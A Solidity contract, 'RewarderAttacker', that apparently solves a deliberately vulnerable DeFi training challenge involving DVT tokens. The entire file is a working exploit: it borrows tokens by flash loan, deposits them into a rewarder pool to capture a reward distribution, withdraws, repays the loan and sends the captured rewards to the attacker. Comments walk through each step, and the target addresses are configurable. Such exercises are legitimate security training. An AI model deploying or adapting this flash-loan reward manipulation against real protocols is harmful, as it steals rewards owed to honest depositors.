pragma solidity ^0.8.0;

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external;
}

interface IRewardToken {
    function approve(address spender, uint256 amount) external;
    function transfer(address receiver, uint256 amount) external;
    function balanceOf(address account) external returns (uint256);
}

interface IBorrowToken {
    function transfer(address receiver, uint256 amount) external;
}

contract RewarderAttacker {

    address payable private _attacker;
    address payable private _target;
    address payable private _loaner;
    address private _rewardToken;
    address private _borrowToken;

    modifier onlyAttacker {
        require(msg.sender == _attacker, "you must be da attacker");
        _;
    }

    constructor(address payable attacker,
        address payable target,
        address payable loaner,
        address rewardToken,
        address borrowToken) {
        _attacker = attacker;
        _target = target;
        _loaner = loaner;
        _rewardToken = rewardToken;
        _borrowToken = borrowToken;
    }

    function attack(uint256 loanAmount) external payable {
        // 1) get flashloan for DVT token
        IFlashLoanerPool(_loaner).flashLoan(loanAmount);
    }

    // flashLoanerPool calls this function with the amount we borrowed
    function receiveFlashLoan(uint256 amount) external payable {
        // approve rewardpool to take your tokens
        IRewardToken(_borrowToken).approve(_target, amount);
        // 2) deposit tokens (deposit function calls distributeRewards)
        IRewarderPool(_target).deposit(amount);
        // 4) withdraw tokens
        IRewarderPool(_target).withdraw(amount);
        // 5) transfer DVT Tokens back to the FlashLoanerPool
        IBorrowToken(_borrowToken).transfer(_loaner, amount);
    }

    function withdrawRewards() external onlyAttacker {
        IRewardToken(_rewardToken).transfer(
            _attacker,
            IRewardToken(_rewardToken).balanceOf(address(this))
        );

    }



    //steps,
    // 1) get flashloan for DVT token
    // 2) deposit tokens
    // 3) call distributeRewards function
    // 4) withdraw tokens
    // 5) transferTokens back to the FlashLoanerPool

    // 6) remember, it is the attacker who should be receiving rewards, NOT this contract





}
